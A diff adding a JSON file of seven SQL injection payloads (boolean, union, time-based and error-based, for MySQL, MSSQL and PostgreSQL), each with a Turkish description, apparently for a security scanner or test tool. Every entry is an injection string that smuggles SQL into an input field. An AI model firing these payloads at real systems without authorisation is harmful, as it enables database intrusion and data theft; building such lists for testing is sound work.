@@ -1,0 +1,37 @@
+[
+  {
+    "payload": "' OR '1'='1' -- ",
+    "type": "boolean-based",
+    "description": "Klasik boolean SQLi denemesi"
+  },
+  {
+    "payload": "' UNION SELECT null, null -- ",
+    "type": "union-based",
+    "description": "Union ile veri çekme denemesi"
+  },
+  {
+    "payload": "' AND 1=0 UNION ALL SELECT NULL, version()--",
+    "type": "union-based",
+    "description": "Versiyon bilgisi çekmeye çalışır"
+  },
+  {
+    "payload": "' AND SLEEP(5)--",
+    "type": "time-based",
+    "description": "MySQL time-based SQLi"
+  },
+  {
+    "payload": "1'; WAITFOR DELAY '0:0:5'--",
+    "type": "time-based",
+    "description": "MSSQL time-based SQLi"
+  },
+  {
+    "payload": "' OR '1'='1",
+    "type": "error-based",
+    "description": "Hata üretmeye çalışır"
+  },
+  {
+    "payload": "1); SELECT pg_sleep(5); --",
+    "type": "time-based",
+    "description": "PostgreSQL time-based SQLi"
+  }
+]
